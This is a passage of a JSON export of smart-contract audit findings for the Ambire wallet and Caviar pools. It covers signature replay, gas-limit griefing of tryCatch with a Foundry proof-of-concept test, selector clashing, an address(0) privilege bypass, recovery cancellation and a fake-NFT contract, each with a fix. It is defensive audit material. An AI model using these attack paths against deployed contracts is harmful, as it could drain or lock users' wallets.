      "summary": "\nA bug was discovered in the Ambire wallet, where the current settings may produce incompatible bytecode with some of the chains supported by the protocol. The Ambire wallet supports and targets different chains such as Ethereum, Polygon, Avalanche, BNB, Optimism, Arbitrum, etc. All of the contracts in scope have the version pragma fixed to be compiled using Solidity 0.8.20, which uses the new `PUSH0` opcode introduced in the Shanghai hard fork. This opcode is now the default EVM version in the compiler and the one being currently used to compile the project. This means that the produced bytecode for the different contracts won't be compatible with the chains that don't yet support the Shanghai hard fork.\n\nTo mitigate this bug, the Solidity compiler version was changed to 0.8.19 or an evm version was defined, which is compatible across all of the intended chains to be supported by the protocol. This was confirmed by reports from adriro, carlitox477, and rbserver.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "https://github.com/code-423n4/2023-05-ambire-findings/issues/12",
      "tags": [],
      "finders": [
        "adriro"
      ]
    },
    {
      "id": "25877",
      "title": "[M-03] Recovery transaction can be replayed after a cancellation",
      "impact": "MEDIUM",
      "content": "\nThe recovery transaction can be replayed after a cancellation of the recovery procedure, reinstating the recovery mechanism.\n\nThe Ambire wallet provides a recovery mechanism in which a privilege can recover access to the wallet if they lose their keys. The process contains three parts; all of them considered in the `execute()` function:\n\n1.  A transaction including a signature with `SIGMODE_RECOVER` mode enqueues the transaction to be executed after the defined timelock. This action should include a signature by one of the defined recovery keys to be valid.\n2.  This can be followed by two paths; the cancellation of the process or the execution of the recovery:\n    *   If the timelock passes, then anyone can complete the execution of the originally submitted bundle.\n    *   A signed cancellation can be submitted to abort the recovery process, which clears the state of `scheduledRecoveries`.\n\nSince nonces are only incremented when the bundle is executed, the call that triggers the recovery procedure can be replayed as long as the nonce stays the same.\n\nThis means that the recovery process can be re-initiated after a cancellation is issued by replaying the original call that initiated the procedure.\n\nNote: this also works for cancellations. If the submitted recovery bundle is the same, then a cancellation can be replayed if the recovery process is initiated again while under the same nonce value.\n\n### Proof of Concept\n\n1.  Recovery process is initiated using a transaction with `SIGMODE_RECOVER` signature mode.\n2.  Procedure is canceled by executing a signed call with `SIGMODE_CANCEL` signature mode.\n3.  Recovery can be re-initiated by replaying the transaction from step 1.\n\n### Recommendation\n\nIncrement the nonce during a cancellation. This will stop the nonce, preventing any previous signature from being replayed.\n\n```solidity\n...\n  if (isCancellation) {\n    delete scheduledRecoveries[hash];\n+   nonce = currentNonce + 1;\n    emit LogRecoveryCancelled(hash, recoveryInfoHash, recoveryKey, block.timestamp);\n  } else {\n    scheduledRecoveries[hash] = block.timestamp + recoveryInfo.timelock;\n    emit LogRecoveryScheduled(hash, recoveryInfoHash, recoveryKey, currentNonce, block.timestamp, txns);\n  }\n  return;\n  ...\n```\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/16#issuecomment-1567748808):**\n>Excellent finding.\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/16#issuecomment-1567748808):**\n > Solved.\n\n**[Ambire mitigated:](https://github.com/code-423n4/2023-06-ambire-mitigation#mitigations-to-be-reviewed)**<br>\n> Increment the nonce to prevent replaying recovery transactions.\n\n**Status:** Not fully mitigated. Full details in reports from [adriro](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/19), [carlitox477](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/6), and [rbserver](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/10), and also included in the Mitigation Review section below.\n\n***\n\n",
      "summary": "\nThe Ambire wallet provides a recovery mechanism in which a privilege can recover access to the wallet if they lose their keys. The process contains three parts; all of them considered in the `execute()` function. The first part is a transaction including a signature with `SIGMODE_RECOVER` mode enqueues the transaction to be executed after the defined timelock. This action should include a signature by one of the defined recovery keys to be valid. After this, the process can be followed by two paths; the cancellation of the process or the execution of the recovery. If the timelock passes, then anyone can complete the execution of the originally submitted bundle. A signed cancellation can be submitted to abort the recovery process, which clears the state of `scheduledRecoveries`.\n\nThe bug reported here is that since nonces are only incremented when the bundle is executed, the call that triggers the recovery procedure can be replayed as long as the nonce stays the same. This means that the recovery process can be re-initiated after a cancellation is issued by replaying the original call that initiated the procedure.\n\nTo fix this, the recommendation is to increment the nonce during a cancellation. This will stop the nonce, preventing any previous signature from being replayed. This fix has not been fully implemented yet, and full details can be found in reports from adriro, carlitox477, and rbserver.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "https://github.com/code-423n4/2023-05-ambire-findings/issues/16",
      "tags": [],
      "finders": [
        "adriro",
        "bin2chen"
      ]
    },
    {
      "id": "25876",
      "title": "[M-02] Attacker can force the failure of transactions that use `tryCatch`",
      "impact": "MEDIUM",
      "content": "\nAn attacker, or malicious relayer, can force the failure of transactions that rely on `tryCatch()` by carefully choosing the gas limit.\n\nThe `tryCatch()` function present in the AmbireAccount contract can be used to execute a call in the context of a wallet, which is eventually allowed to fail; i.e. the operation doesn't revert if the call fails.\n\n```solidity\n119: \tfunction tryCatch(address to, uint256 value, bytes calldata data) external payable {\n120: \t\trequire(msg.sender == address(this), 'ONLY_IDENTITY_CAN_CALL');\n121: \t\t(bool success, bytes memory returnData) = to.call{ value: value, gas: gasleft() }(data);\n122: \t\tif (!success) emit LogErr(to, value, data, returnData);\n123: \t}\n```\n\n[EIP-150](https://eips.ethereum.org/EIPS/eip-150) introduces the \"rule of 1/64th\" in which 1/64th of the available gas is reserved in the calling context and the rest of it is forward to the external call. This means that, potentially, the called function can run out of gas, while the calling context may have some gas to eventually continue and finish execution successfully.\n\nA malicious relayer, or a malicious actor that front-runs the transaction, can carefully choose the gas limit to make the call to `tryCatch()` fail due out of gas, while still saving some gas in the main context to continue execution. Even if the underlying call in `tryCatch()` would succeed, an attacker can force its failure while the main call to the wallet is successfully executed.\n\n### Proof of Concept\n\nThe following test reproduces the attack. The user creates a transaction to execute a call using `tryCatch()` to a function of the `TestTryCatch` contract, which simulates some operations that consume gas. The attacker then executes the bundle by carefully choosing the gas limit (450,000 units of gas in this case) so that the call to `TestTryCatch` fails due to out of gas, but the main call to `execute()` in the wallet (here simplified by using `executeBySender()` to avoid signatures) gets correctly executed.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/535a969c96e0a6f78781287bd0931b6a).\n\n```solidity\ncontract TestTryCatch {\n    uint256[20] public foo;\n\n    function test() external {\n        // simulate expensive operation\n        for (uint256 index = 0; index < 20; index++) {\n            foo[index] = index + 1;\n        }\n    }\n}\n\nfunction test_AmbireAccount_ForceFailTryCatch() public {\n    address user = makeAddr(\"user\");\n\n    address[] memory addrs = new address[](1);\n    addrs[0] = user;\n    AmbireAccount account = new AmbireAccount(addrs);\n\n    TestTryCatch testTryCatch = new TestTryCatch();\n\n    AmbireAccount.Transaction[] memory txns = new AmbireAccount.Transaction[](1);\n    txns[0].to = address(account);\n    txns[0].value = 0;\n    txns[0].data = abi.encodeWithSelector(\n        AmbireAccount.tryCatch.selector,\n        address(testTryCatch),\n        uint256(0),\n        abi.encodeWithSelector(TestTryCatch.test.selector)\n    );\n\n    // This should actually be a call to \"execute\", we simplify the case using \"executeBySender\"\n    // to avoid the complexity of providing a signature. Core issue remains the same.\n    vm.expectEmit(true, false, false, false);\n    emit LogErr(address(testTryCatch), 0, \"\", \"\");\n    vm.prank(user);\n    account.executeBySender{gas: 450_000}(txns);\n\n    // assert call to TestTryCatch failed\n    assertEq(testTryCatch.foo(0), 0);\n}\n```\n### Recommendation\n\nThe context that calls in `tryCatch()`, can check the remaining gas after the call to determine if the remaining amount is greater than 1/64 of the available gas, before the external call.\n\n```solidity\n  function tryCatch(address to, uint256 value, bytes calldata data) external payable {\n      require(msg.sender == address(this), 'ONLY_IDENTITY_CAN_CALL');\n+     uint256 gasBefore = gasleft();\n      (bool success, bytes memory returnData) = to.call{ value: value, gas: gasleft() }(data);\n+     require(gasleft() > gasBefore/64);\n      if (!success) emit LogErr(to, value, data, returnData);\n  }\n```\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/18#issuecomment-1567747570):**\n > @Picodes - we tend to disagree with the severity here. Gas attacks are possible in almost all cases of using Ambire accounts through a relayer. It's an inherent design compromise of ERC-4337 as well, and the only way to counter it is with appropriate offchain checks/reputation systems and griefing protections.\n> \n> Also, the solution seems too finicky. What if the `tryCatch` is called within execute (which it very likely will), which requires even more gas left to complete? Then 1) the solution won't be reliable 2) the attacker can make the attack anyway through execute\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/18#issuecomment-1570505823):**\n > The main issue here is, the nonce is incremented, despite the fact the transaction wasn't executed as intended, which would force the user to resign the payload and would be a griefing attack against the user. I do break an important invariant, which if the nonce is incremented, the transaction signed by the user was included as he intended.\n> \n> Also, I think this can be used within `tryCatchLimit` to pass a lower `gasLimit`: quoting [EIP150](https://eips.ethereum.org/EIPS/eip-150):\n> \"If a call asks for more gas than the maximum allowed amount (i.e. the total amount of gas remaining in the parent after subtracting the gas cost of the call and memory expansion), do not return an OOG error; instead, if a call asks for more gas than all but one 64th of the maximum allowed amount, call with all but one 64th of the maximum allowed amount of gas (this is equivalent to a version of EIP-90[1](https://github.com/ethereum/EIPs/issues/90) plus EIP-114[2](https://github.com/ethereum/EIPs/issues/114)).\"\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/18#issuecomment-1571555097):**\n > @Picodes - I'm not sure I understand. The whole point of signing something that calls into `tryCatch` is that you don't care about the case where the nonce is incremented, but the transaction is failing. What am I missing?\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/18#issuecomment-1573629324):**\n > > The whole point of signing something that calls into `tryCatch` is that you don't care about the case where the nonce is incremented but the transaction is failing\n> \n> You don't care if the transactions fail because the sub-call is invalid, but you do if it's because the relayer manipulated the gas, right?\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/18#issuecomment-1592963193):**\n>@Picodes - Ok, I see the point here - probably repeating stuff that others said before, but trying to simplify.  The relayer can rug users by taking their fee, regardless of the fact that the inner transactions fail, due to the relayer using a lower `gasLimit`. This would be possible if some of the sub-transactions use `tryCatch`, but the fee payment does not.\n>\n>However, I'm not sure how the mitigation would work. Can the relayer still calculate a \"right\" gas limit for which the `tryCatch` will fail, but the rest will succeed?\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/18#issuecomment-1593011603):**\n>My understanding is that using `gasleft() > gasBefore/64`, we know for sure than the inner call didn't fail due to an out of gas, as it was called with `63*gasBefore/64`. So the relayer has to give enough gas for every subcall to execute fully, whether it is successful or not.\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/18#issuecomment-1593043044):**\n>I see, this sounds reasonable. I need a bit more time to think about it and if it is, we'll apply this mitigation.\n\n**[Ambire mitigated:](https://github.com/code-423n4/2023-06-ambire-mitigation#mitigations-to-be-reviewed)**\n> Check gasleft to prevent this attack.\n\n**Status:** Not fully mitigated. Full details in reports from [adriro](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/15) and [carlitox477](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/9), and also included in the Mitigation Review section below.\n***\n\n",
      "summary": "\nA bug has been discovered in the AmbireAccount contract, which allows malicious actors to force the failure of transactions that rely on the `tryCatch()` function. `tryCatch()` is used to execute a call in the context of a wallet, which is allowed to fail if the call does not succeed. The bug is caused by the \"rule of 1/64th\" introduced in [EIP-150](https://eips.ethereum.org/EIPS/eip-150), which reserves 1/64th of the available gas in the calling context, and the rest is forwarded to the external call. A malicious actor can carefully choose the gas limit to make the call to `tryCatch()` fail due to out of gas, while still saving some gas in the main context to continue execution successfully.\n\nA proof of concept was created to reproduce the attack, which showed that the user creates a transaction to execute a call using `tryCatch()` to a function of the `TestTryCatch` contract, and the attacker then executes the bundle by carefully choosing the gas limit so that the call to `TestTryCatch` fails due to out of gas, but the main call to the wallet is successfully executed.\n\nThe recommended mitigation for this bug is to check the remaining gas after the call to determine if the remaining amount is greater than 1/64 of the available gas, before the external call. This is to ensure that the called function has enough gas to execute fully. However, it has not been fully mitigated yet, as there are still some issues with the mitigation that need to be addressed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "https://github.com/code-423n4/2023-05-ambire-findings/issues/18",
      "tags": [],
      "finders": [
        "adriro"
      ]
    },
    {
      "id": "25875",
      "title": "[M-01] Fallback handlers can trick users into calling functions of the AmbireAccount contract",
      "impact": "MEDIUM",
      "content": "\nSelector clashing can be used to trick users into calling base functions of the wallet.\n\nFallback handlers provide extensibility to the Ambire wallet. The main idea here is that functions not present in the wallet implementation are delegated to the fallback handler by using the `fallback()` function.\n\nFunction dispatch in Solidity is done using function selectors. Selectors are represented by the first 4 bytes of the keccak hash of the function signature (name + argument types). It is possible (and not computationally difficult) to find different functions that have the same selector.\n\nThis means that a malicious actor can craft a fallback handler with a function signature carefully selected to match one of the functions present in the base AmbireAccount contract, and with an innocent looking implementation. While the fallback implementation may seem harmless, this function, when called, will actually trigger the function in the base AmbireAccount contract. This can be used, for example, to hide a call to `setAddrPrivilege()` which could be used to grant control of the wallet to the malicious actor.\n\nThis is similar to the exploit reported on proxies in [this article](https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357), which caused the proposal of the transparent proxy pattern.\n\nAs further reference, another [similar issue](https://github.com/romeroadrian/audits/blob/main/code4rena/2022-11-debtdao/H-01.md) can be found in the DebtDAO audit that could lead to unnoticed calls due to selector clashing (disclaimer: the linked report is authored by me).\n\n### Recommendation\n\nIt is difficult to provide a recommendation based on the current design of contracts. Any whitelisting or validation around the selector won't work as the main entry point of the wallet is the AmbireAccount contract itself. The solution would need to be based on something similar to what was proposed for transparent proxies, which involves segmenting the calls to avoid clashing, but this could cripple the functionality and simplicity of the wallet.\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/21#issuecomment-1564930049):**\n > I'm not sure if this is applicable: the use case of this is the Ambire team pushing out fallback handlers and allowing users to opt into them. While this does leave an opportunity for us to be that malicious actor, I'm not sure there's a better trade off here.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/21#issuecomment-1566172322):**\n > The scenario is convincing; provided the attacker manages to have its malicious implementation of `fallbackHandler` used by Ambire wallet users, which seems unlikely, but doable. Furthermore, as there are no admin roles here, the possibility of this attack by the Ambire team is worth stating.\n> \n> Overall, I think Medium severity is appropriate. I agree with the previous comments that there is no clear mitigation though, aside from warning users about this.\n\n***\n\n",
      "summary": "\nThe Ambire wallet allows users to extend its functionality with the use of fallback handlers. These handlers are called using the `fallback()` function, which is done using function selectors in Solidity. It is possible to find different functions that have the same selector, which can be used by malicious actors to craft a fallback handler with a function signature that matches one of the functions present in the base AmbireAccount contract. This can be used to hide a call to `setAddrPrivilege()` which could grant control of the wallet to the malicious actor.\n\nSimilar exploits have been reported in the past and it is difficult to provide a recommendation for this issue based on the current design of the contracts. The proposed solution is similar to what was proposed for transparent proxies, which involves segmenting the calls to avoid clashing, but this could reduce the functionality and simplicity of the wallet.\n\nThe possibility of this attack by the Ambire team is worth noting, but there is no clear mitigation aside from warning users about this. The severity of this issue has been deemed as medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "https://github.com/code-423n4/2023-05-ambire-findings/issues/21",
      "tags": [],
      "finders": [
        "adriro"
      ]
    },
    {
      "id": "20586",
      "title": "[L-04] Signature expiry is not implemented in the protocol",
      "impact": "LOW",
      "content": "Let's say a user signs a bundle of transactions and expects the relayer to execute it, including a tip for him. Now if the gas price spikes up very quickly it can become not economically viable for the relayer to execute the bundle, so the transaction might stay stale for a while. When the gas price falls back the market could have changed, which can result in for example swaps receiving less value than they should have. To combat this it is useful to add a signature expiry/deadline property, after which a bundle would be invalid to execute.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-05-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "20585",
      "title": "[L-03] Not all call paths are anti-bricking protected",
      "impact": "LOW",
      "content": "Both the `execute` and `executeBySender` call paths have anti-bricking protection that looks like:\n\n```solidity\nrequire(privileges[signerKey] != bytes32(0), 'PRIVILEGE_NOT_DOWNGRADED');\n```\n\nand\n\n```solidity\nrequire(privileges[msg.sender] != bytes32(0), 'PRIVILEGE_NOT_DOWNGRADED');\n```\n\nThe problem is that the `fallback` call path is missing this protection, which means not 100% of cases are covered. A possible partial solution is to check if the caller's privileges were downgraded in the `delegatecall` and if they were to revert. Still, not all cases can be handled properly here, so document this well when explaining the expected fallback handler behavior.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-05-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "20584",
      "title": "[L-02] Schnorr signatures are insufficiently validated",
      "impact": "LOW",
      "content": "As per [Chainlink's Schnorr signatures verification implementation](https://github.com/smartcontractkit/chainlink/blob/bb214c5d7ec172de400a72a1d8851ff639c979d2/evm/v0.5/contracts/dev/SchnorrSECP256K1.sol#L107-L109) it is recommended to check that the Schnorr signature is strongly less than the `Q` constant as well as the public key's X coordinate to be less than `Q/2`. This protects from signature malleability attacks which are not currently a problem in the system because there are nonces in the signatures.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-05-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "20583",
      "title": "[L-01] The `ecrecover` precompile is vulnerable to signature malleability",
      "impact": "LOW",
      "content": "By flipping `s` and `v` it is possible to create a different signature that will amount to the same hash & signer. This is fixed in OpenZeppelin's ECDSA library like [this](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/dfef6a68ee18dbd2e1f5a099061a3b8a0e404485/contracts/utils/cryptography/ECDSA.sol#L125-L136). While this is not a problem since there are nonces in the system signatures, it is still highly recommended that problem is addressed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-05-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "20582",
      "title": "[M-01] Invalid signature execution is possible if `address(0)` has non-zero privileges",
      "impact": "MEDIUM",
      "content": "**Impact:**\nHigh, as anyone will be able to steal all funds from a given wallet\n\n**Likelihood:**\nLow, as it requires `address(0)` to have non-zero privileges\n\n**Description**\n\nThe problem is similar to [this](https://github.com/code-423n4/2021-10-ambire-findings/issues/13) issue from a previous audit. The code in `SignatureValidator::recoverAddrImpl` will return `address(0)` if it receives a valid `Schnorr` signature but not one that is for the given `hash` (transactions hash). Now the result will be checked like this:\n\n```solidity\nsignerKey = SignatureValidator.recoverAddrImpl(hash, signature, true);\nrequire(privileges[signerKey] != bytes32(0), 'INSUFFICIENT_PRIVILEGE');\n```\n\nMeaning `signerKey` will be `address(0)` and now if the value for `privileges[address(0)]` is non-zero, then anyone will be able to execute any transaction for this wallet, for example stealing all funds.\n\nAlso, it is possible to get `recoverAddrImpl` to return `address(0)` if you provide a signature with `SignatureMode == Multisig` and then the signatures inside it to be of type `SignatureMode == Spoof`. Since `allowSpoofing` argument will be `false`, then we will get to the `return address(0);` code in the end of the method.\n\nA third way to get `recoverAddrImpl` to return `address(0)` is if you use `SignatureMode == Multisig` and just provide an empty array of signatures - then it will return the default value of `address signer` which is `address(0)`\n\n**Recommendations**\n\nMake sure to never have a path where `recoverAddrImpl` returns `address(0)`, instead just revert the transaction. Also remove the comment `// should be impossible to get here` as it is false.",
      "summary": "\nThis bug report is about a vulnerability in the code of a wallet which allows anyone to steal all funds from a given wallet. The code in `SignatureValidator::recoverAddrImpl` will return `address(0)` if it receives a valid `Schnorr` signature but not one that is for the given `hash` (transactions hash). This could happen if `privileges[address(0)]` is non-zero, if a signature with `SignatureMode == Multisig` and `SignatureMode == Spoof` is provided, or if an empty array of signatures is used. \n\nThe likelihood of this vulnerability being exploited is low as it requires `address(0)` to have non-zero privileges. However, the impact is high as anyone will be able to steal all funds from a given wallet. \n\nTo mitigate this vulnerability, it is recommended to never have a path where `recoverAddrImpl` returns `address(0)`, instead just revert the transaction. Additionally, the comment `// should be impossible to get here` should be removed as it is false.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-05-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "20581",
      "title": "[C-01] Anyone can cancel another user's scheduled recovery",
      "impact": "HIGH",
      "content": "**Impact:**\nHigh, as important protocol feature can be permanently blocked for a victim user\n\n**Likelihood:**\nHigh, as it has no preconditions and can be exploited by anyone\n\n**Description**\n\nA wallet recovery mechanism in Ambire allows a pre-set account (usually the relayer) to set a new main signer after the initial one was stolen/lost. It works by calling `execute` with a `SIGMODE_RECOVER` signature. This will store the request in the contract like this, scheduling it for the future:\n\n```solidity\nscheduledRecoveries[hash] = block.timestamp + recoveryInfo.timelock;\nemit LogRecoveryScheduled(hash, recoveryInfoHash, recoveryKey, currentNonce, block.timestamp, txns);\n```\n\nThe contract also allows an option to cancel a scheduled recovery, by using a `SIGMODE_CANCEL` signature. The problem is that the `hash` that is stored as a scheduled recovery does not contain the `isCancellation` flag (which just checks if the signature mode is `SIGMODE_CANCEL`). Since the flag isn't part of this hash, anyone can call `execute` with the same `signature` parameter as when `SIGMODE_RECOVER` was used, but just changing the last byte so it uses `SIGMODE_CANCEL`. This means that anyone can cancel another user's scheduled recovery without any preconditions, which leads to a griefing attack vector on wallet recoveries. An attacker can go to an extend to write a script that will cancel a scheduled recovery a few minutes before it is about to pass.\n\n**Recommendations**\n\nAdd the `isCancellation` flag to the `hash` so that the initial `SIGMODE_RECOVER` signature can't be changed into a `SIGMODE_CANCEL` one and reused.",
      "summary": "\nA bug has been found in Ambire's wallet recovery mechanism which allows anyone to cancel a scheduled recovery without any preconditions. This could lead to a griefing attack vector on wallet recoveries, where an attacker could write a script to cancel a scheduled recovery a few minutes before it is about to pass, permanently blocking an important protocol feature for a victim user.\n\nThe problem is that the `hash` that is stored as a scheduled recovery does not contain the `isCancellation` flag, which just checks if the signature mode is `SIGMODE_CANCEL`. This means that anyone can call `execute` with the same `signature` parameter as when `SIGMODE_RECOVER` was used, but just changing the last byte so it uses `SIGMODE_CANCEL`.\n\nThe bug has a high impact and likelihood, as it has no preconditions and can be exploited by anyone. To fix the issue, it is recommended to add the `isCancellation` flag to the `hash` so that the initial `SIGMODE_RECOVER` signature can't be changed into a `SIGMODE_CANCEL` one and reused.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-05-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "43396",
      "title": "[M-17] The `tokenURI` method does not check if the NFT has been minted and returns data for the contract that may be a fake NFT",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17>\n\n### Impact\n\n*   By invoking the [Factory.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161) method for a maliciously provided NFT id, the returned data may deceive potential users, as the method will return data for a non-existent NFT id that appears to be a genuine PrivatePool. This can lead to a poor user experience or financial loss for users.\n*   Violation of the [ERC721-Metadata part](https://eips.ethereum.org/EIPS/eip-721) standard\n\n### Proof of Concept\n\n*   The [Factory.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161) and [PrivatePoolMetadata.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17) methods lack any requirements stating that the provided NFT id must be created. We can also see that in the standard implementation by [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cf86fd9962701396457e50ab0d6cc78aa29a5ebc/contracts/token/ERC721/ERC721.sol#L94), this check is present:\n*   [Throws if `_tokenId` is not a valid NFT](https://eips.ethereum.org/EIPS/eip-721)\n\n**Example**\n\n1.  User creates a fake contract<br>\n    A simple example so that the `tokenURI` method does not revert:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\ncontract NFT {\n    function balanceOf(address) external pure returns (uint256) {\n        1;\n    }\n}\n\ncontract NonNFT {\n    address public immutable nft;\n\n    address public constant baseToken = address(0);\n    uint256 public constant virtualBaseTokenReserves = 1 ether;\n    uint256 public constant virtualNftReserves = 1 ether;\n    uint256 public constant feeRate = 500;\n\n    constructor() {\n        nft = address(new NFT());\n    }\n}\n```\n\n2.  User deploy the contract\n3.  Now, by using `tokenURI()` for the deployed user's address, one can fetch information about a non-existent NFT.\n\n### Tools Used\n\n*   Manual review\n*   Foundry\n\n### Recommended Mitigation Steps\n\n*   Throw an error if the NFT id is invalid.\n\n**[outdoteth (Caviar) confirmed and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/44#issuecomment-1518694046):**\n > Not sure if this should be medium or not.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/44#issuecomment-1525111686):**\n > https://eips.ethereum.org/EIPS/eip-721#:~:text=function%20tokenURI(uint256%20_tokenId)%20external%20view%20returns%20(string)%3B\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/44#issuecomment-1527230841):**\n > Because the functionality breaks the EIP721 spec, I agree with Medium Severity, no funds are at risk.\n\n**[outdoteth (Caviar) mitigated](https://github.com/code-423n4/2023-05-caviar-mitigation-contest#mitigations-to-be-reviewed):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/19.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/28), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/46), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/17).\n\n\n\n***\n\n",
      "summary": "\nThe bug report describes a vulnerability in the code of a project called Caviar. This vulnerability allows a malicious user to deceive potential users by providing a fake NFT id, which can lead to a poor user experience or financial loss. This is a violation of the ERC721-Metadata standard. The report includes a proof of concept and recommends throwing an error if the NFT id is invalid as a mitigation step. The bug has been mitigated by the project team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/44",
      "tags": [],
      "finders": [
        "Haipls",
        "Rolezn",
        "0xSmartContract"
      ]
    },
    {
      "id": "43395",
      "title": "[M-16] `PrivatePool.flashLoan()` takes fee from the wrong address",
      "impact": "MEDIUM",
      "content": "\nInstead of taking the fee from the receiver of the flashloan callback, it pulls it from `msg.sender`.\n\nAs specified in [EIP-3156](https://eips.ethereum.org/EIPS/eip-3156#lender-specification):\n\n> \"After the callback, the flashLoan function MUST take the amount + fee token from the receiver, or revert if this is not successful.\"\n\nThis will be an unexpected loss of funds for the caller if they have the pool pre-approved to spend funds (e.g. they previously bought NFTs) and are not the owner of the flashloan contract they use for the callback.\n\nAdditionally, for ETH pools, it expects the caller to pay the fee upfront. But, the fee is generally paid with the profits made using the flashloaned tokens.\n\n### Proof of Concept\n\nIf `baseToken` is ETH, it expects the fee to already be sent with the call to `flashLoan()`. If it's an ERC20 token, it will pull it from `msg.sender` instead of `receiver`:\n\n```sol\n    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 tokenId, bytes calldata data)\n        external\n        payable\n        returns (bool)\n    {\n        // ...\n\n        // calculate the fee\n        uint256 fee = flashFee(token, tokenId);\n\n        // if base token is ETH then check that caller sent enough for the fee\n        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();\n        \n        // ...\n\n        // transfer the fee from the borrower\n        if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n\n        return 